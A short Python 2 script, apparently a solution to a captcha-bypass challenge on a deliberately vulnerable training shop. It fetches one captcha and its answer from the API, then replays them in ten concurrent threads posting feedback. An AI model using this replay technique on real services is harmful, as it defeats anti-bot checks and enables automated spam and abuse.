# -*- coding: utf-8 -*-
import requests
import json
import threading

'''
创建thread并在run函数中发送feadback
'''

class request_thread(threading.Thread):
    def __init__(self,id,server,payload):
        threading.Thread.__init__(self)
        self.id = id
        self.payload = payload
        self.server = server
    def run(self):
        print 'Thread No.%d start' %self.id
        r=requests.post(server+'/api/Feedbacks/',data=payload)
        dic=json.loads(r.text)
        print 'Thread No.{} return {}'.format(self.id,dic['status'])
'''
获取captcha，主要用到ID和answer
'''
def get_captcha():
    r=requests.get(server+'/rest/captcha/')
    print r.text
    dict=json.loads(r.text)
    return dict

'''
获取captcha，创建10个发送线程
'''
server = 'https://your server address'
server = 'https://jui-ce-shop.herokuapp.com'
dict=get_captcha()
payload={"captchaId":dict['captchaId'],"captcha":dict['answer'],"comment":"dfd","rating":1}
print payload
for i in range(0,10):
    request_thread(i,server,payload).start()
